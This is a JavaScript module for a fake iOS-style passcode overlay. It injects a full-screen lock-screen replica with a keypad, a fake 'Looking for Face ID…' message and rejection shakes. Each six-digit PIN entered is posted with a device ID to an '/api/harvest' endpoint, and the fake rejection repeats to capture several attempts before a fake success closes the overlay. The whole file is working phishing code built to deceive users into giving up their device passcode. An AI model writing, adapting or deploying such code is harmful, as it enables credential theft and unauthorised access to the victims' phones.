import { CONFIG } from '../config.js';

let _overlay = null;
let _pin = [];
let _attempt = 0;
let _opts = {};

export function showPinHarvest(opts = {}) {
  if (_overlay) return;
  _opts = opts;
  _pin = [];
  _attempt = 0;
  _injectStyles();
  _overlay = _buildOverlay(opts);
  document.body.appendChild(_overlay);
}

export function hidePinHarvest() {
  if (_overlay) { _overlay.remove(); _overlay = null; }
}

// ─── Styles ──────────────────────────────────────────────────────────────────

function _injectStyles() {
  if (document.getElementById('wc-pin-styles')) return;
  const s = document.createElement('style');
  s.id = 'wc-pin-styles';
  s.textContent = `
@font-face {
  font-family:"SF Pro Display";
  src:url("./SF-Pro-Display-Regular.otf") format("opentype");
  font-weight:400;
}
@font-face {
  font-family:"SF Pro Display";
  src:url("./SF-Pro-Display-Light.otf") format("opentype");
  font-weight:300;
}
@font-face {
  font-family:"SF Pro Text";
  src:url("./SF-Pro-Text-Regular.otf") format("opentype");
  font-weight:400;
}
@font-face {
  font-family:"SF Pro Text";
  src:url("./SF-Pro-Text-Medium.otf") format("opentype");
  font-weight:500;
}
#wc-pin-harvest {
  position:fixed;inset:0;z-index:99999;
  background:rgba(2,8,28,0.78);
  -webkit-backdrop-filter:blur(40px) saturate(140%);
  backdrop-filter:blur(40px) saturate(140%);
  color:#fff;
  font-family:"SF Pro Display",-apple-system,BlinkMacSystemFont,sans-serif;
  user-select:none;-webkit-user-select:none;
  -webkit-tap-highlight-color:transparent;
}
.wc-actionBtn {
  position:absolute;
  bottom:calc(66 / 932 * 100svh);
  background:none;border:none;padding:0;cursor:pointer;
  color:#fff;opacity:1;
  font-family:"SF Pro Text",-apple-system,BlinkMacSystemFont,sans-serif;
  font-size:calc(17 / 430 * 100vw);
  line-height:1;font-weight:400;
  transition:opacity 120ms ease-out;
}
#wc-emergencyBtn { left:calc(63 / 430 * 100vw); }
#wc-cancelBtn,#wc-deleteBtn { right:calc(79 / 430 * 100vw); }
#wc-deleteBtn { opacity:0;pointer-events:none; }
#wc-pinLabel {
  position:absolute;
  top:calc(178 / 932 * 100svh);
  left:50%;transform:translateX(-50%);
  white-space:nowrap;
  font-family:"SF Pro Display",-apple-system,BlinkMacSystemFont,sans-serif;
  font-size:calc(24 / 430 * 100vw);
  line-height:1;font-weight:400;color:#fff;letter-spacing:0;
}
#wc-dots {
  position:absolute;
  top:calc(220 / 932 * 100svh);
  left:50%;transform:translateX(-50%);
  display:flex;align-items:center;
  gap:calc(24 / 430 * 100vw);
}
.wc-dot {
  width:calc(13 / 430 * 100vw);height:calc(13 / 430 * 100vw);
  border-radius:50%;
  border:1.5px solid rgba(255,255,255,0.78);
  background:transparent;flex-shrink:0;
  transition:background-color 120ms ease-out,border-color 120ms ease-out;
}
.wc-dot.filled { background:#fff;border-color:#fff; }
#wc-keypad {
  position:absolute;
  top:calc(316.5 / 932 * 100svh);
  left:calc(46.5 / 430 * 100vw);
  display:grid;
  grid-template-columns:repeat(3,calc(112.25 / 430 * 100vw));
  grid-template-rows:repeat(4,calc(108.4 / 932 * 100svh));
  width:calc(336.75 / 430 * 100vw);
}
.wc-keyCell { display:flex;align-items:center;justify-content:center; }
.wc-keyBtn {
  position:relative;
  width:calc(87 / 430 * 100vw);height:calc(87 / 430 * 100vw);
  border-radius:50%;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  cursor:pointer;flex-shrink:0;color:#fff;
  background:rgba(255,255,255,0.18);
  border:1px solid rgba(255,255,255,0.12);
  box-shadow:
    inset 0 1px 0 rgba(255,255,255,0.10),
    inset 0 -1px 0 rgba(0,0,0,0.12),
    0 1px 2px rgba(0,0,0,0.10);
  transition:background-color 120ms ease-out,opacity 120ms ease-out;
}
.wc-keyBtn.isPressed { background:rgba(255,255,255,0.32); }
.wc-keyBtn[data-digit="1"] .wc-keyNum {
  transform:translateY(calc(-8 / 430 * 100vw));
}
.wc-keyNum {
  font-family:"SF Pro Display",-apple-system,BlinkMacSystemFont,sans-serif;
  font-size:calc(41 / 430 * 100vw);
  line-height:0.92;font-weight:300;letter-spacing:0;color:#fff;
}
.wc-keySub {
  font-family:"SF Pro Text",-apple-system,BlinkMacSystemFont,sans-serif;
  font-size:calc(12 / 430 * 100vw);
  line-height:1;font-weight:500;
  letter-spacing:0.18em;
  color:rgba(255,255,255,0.94);
  margin-top:calc(6 / 932 * 100svh);
  padding-left:0.18em;
}
@keyframes wc-success-pulse {
  0%   { transform:scale(1); }
  40%  { transform:scale(1.18); }
  70%  { transform:scale(0.96); }
  100% { transform:scale(1); }
}
@keyframes wc-fadeout {
  0%   { opacity:1; }
  100% { opacity:0; }
}
@keyframes wc-shake {
  0%  { transform:translateX(-50%) translateX(0); }
  15% { transform:translateX(-50%) translateX(-9px); }
  30% { transform:translateX(-50%) translateX(9px); }
  45% { transform:translateX(-50%) translateX(-6px); }
  60% { transform:translateX(-50%) translateX(6px); }
  75% { transform:translateX(-50%) translateX(-3px); }
  90% { transform:translateX(-50%) translateX(3px); }
  100%{ transform:translateX(-50%) translateX(0); }
}
`;
  document.head.appendChild(s);
}

// ─── Overlay ─────────────────────────────────────────────────────────────────

const KEYS = [
  {d:'1',s:''}, {d:'2',s:'ABC'}, {d:'3',s:'DEF'},
  {d:'4',s:'GHI'}, {d:'5',s:'JKL'}, {d:'6',s:'MNO'},
  {d:'7',s:'PQRS'}, {d:'8',s:'TUV'}, {d:'9',s:'WXYZ'},
  {d:null}, {d:'0',s:''}, {d:null},
];

function _buildOverlay(opts) {
  const el = document.createElement('div');
  el.id = 'wc-pin-harvest';

  // Bottom actions
  const emergencyBtn = document.createElement('button');
  emergencyBtn.id = 'wc-emergencyBtn';
  emergencyBtn.className = 'wc-actionBtn';
  emergencyBtn.textContent = 'Emergency';
  el.appendChild(emergencyBtn);

  const cancelBtn = document.createElement('button');
  cancelBtn.id = 'wc-cancelBtn';
  cancelBtn.className = 'wc-actionBtn';
  cancelBtn.textContent = 'Cancel';
  cancelBtn.addEventListener('click', () => _fakeFaceId(label));
  cancelBtn.addEventListener('touchstart', e => { e.preventDefault(); _fakeFaceId(label); }, {passive:false});
  el.appendChild(cancelBtn);

  const deleteBtn = document.createElement('button');
  deleteBtn.id = 'wc-deleteBtn';
  deleteBtn.className = 'wc-actionBtn';
  deleteBtn.textContent = 'Delete';
  deleteBtn.addEventListener('click', () => _onDelete(dotsWrap, cancelBtn, deleteBtn));
  deleteBtn.addEventListener('touchstart', e => { e.preventDefault(); _onDelete(dotsWrap, cancelBtn, deleteBtn); }, {passive:false});
  el.appendChild(deleteBtn);

  // Label
  const label = document.createElement('div');
  label.id = 'wc-pinLabel';
  label.textContent = 'Enter Passcode';
  el.appendChild(label);

  // Dots
  const dotsWrap = document.createElement('div');
  dotsWrap.id = 'wc-dots';
  for (let i = 0; i < 6; i++) {
    const dot = document.createElement('div');
    dot.className = 'wc-dot';
    dotsWrap.appendChild(dot);
  }
  el.appendChild(dotsWrap);

  // Keypad
  const keypad = document.createElement('div');
  keypad.id = 'wc-keypad';

  KEYS.forEach(({d, s}) => {
    const cell = document.createElement('div');
    cell.className = 'wc-keyCell';

    if (d !== null) {
      const btn = document.createElement('div');
      btn.className = 'wc-keyBtn';
      btn.dataset.digit = d;

      const num = document.createElement('div');
      num.className = 'wc-keyNum';
      num.textContent = d;
      btn.appendChild(num);

      if (s) {
        const sub = document.createElement('div');
        sub.className = 'wc-keySub';
        sub.textContent = s;
        btn.appendChild(sub);
      }

      const press = () => {
        btn.classList.add('isPressed');
        _onDigit(d, dotsWrap, cancelBtn, deleteBtn, opts);
      };
      const rel = () => btn.classList.remove('isPressed');

      btn.addEventListener('touchstart', e => { e.preventDefault(); press(); }, {passive:false});
      btn.addEventListener('touchend', rel);
      btn.addEventListener('touchcancel', rel);
      btn.addEventListener('mousedown', press);
      btn.addEventListener('mouseup', rel);
      btn.addEventListener('mouseleave', rel);

      cell.appendChild(btn);
    }

    keypad.appendChild(cell);
  });

  el.appendChild(keypad);
  return el;
}

// ─── Logic ───────────────────────────────────────────────────────────────────

function _syncActions(cancelBtn, deleteBtn) {
  const has = _pin.length > 0;
  cancelBtn.style.opacity       = has ? '0' : '1';
  cancelBtn.style.pointerEvents = has ? 'none' : 'auto';
  deleteBtn.style.opacity       = has ? '1' : '0';
  deleteBtn.style.pointerEvents = has ? 'auto' : 'none';
}

function _updateDots(dotsWrap) {
  dotsWrap.querySelectorAll('.wc-dot').forEach((dot, i) => {
    dot.classList.toggle('filled', i < _pin.length);
  });
}

function _onDigit(d, dotsWrap, cancelBtn, deleteBtn, opts) {
  if (_pin.length >= 6) return;
  _pin.push(d);
  _updateDots(dotsWrap);
  _syncActions(cancelBtn, deleteBtn);
  if (_pin.length === 6) setTimeout(() => _submitPin(dotsWrap, cancelBtn, deleteBtn, opts), 350);
}

function _onDelete(dotsWrap, cancelBtn, deleteBtn) {
  if (!_pin.length) return;
  _pin.pop();
  _updateDots(dotsWrap);
  _syncActions(cancelBtn, deleteBtn);
}

function _submitPin(dotsWrap, cancelBtn, deleteBtn, opts) {
  const pin = _pin.join('');
  _attempt++;
  const attempt = _attempt;

  fetch('/api/harvest', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({device_id: CONFIG?.deviceId, type: 'pin_capture', data: {pin, attempt}})
  }).catch(() => {});

  if (typeof opts.onCapture === 'function') {
    try { opts.onCapture(pin, attempt); } catch (_) {}
  }

  const maxAttempts = opts.attempts ?? Infinity;
  if (maxAttempts !== Infinity && attempt >= maxAttempts) {
    _successAndHide(dotsWrap);
    return;
  }
  _shakeAndReset(dotsWrap, cancelBtn, deleteBtn, null);
}

function _successAndHide(dotsWrap) {
  dotsWrap.style.animation = 'wc-success-pulse 0.4s ease';
  setTimeout(() => {
    dotsWrap.style.animation = '';
    if (_overlay) {
      _overlay.style.transition = 'opacity 0.35s ease';
      _overlay.style.opacity = '0';
    }
    setTimeout(() => hidePinHarvest(), 380);
  }, 450);
}

function _shakeAndReset(dotsWrap, cancelBtn, deleteBtn, onDone) {
  dotsWrap.style.animation = 'wc-shake 0.45s ease';
  setTimeout(() => {
    dotsWrap.style.animation = '';
    _pin = [];
    _updateDots(dotsWrap);
    _syncActions(cancelBtn, deleteBtn);
    if (typeof onDone === 'function') onDone();
  }, 500);
}

function _fakeFaceId(label) {
  label.textContent = 'Looking for Face ID…';
  setTimeout(() => { label.textContent = 'Enter Passcode'; }, 1400);
}
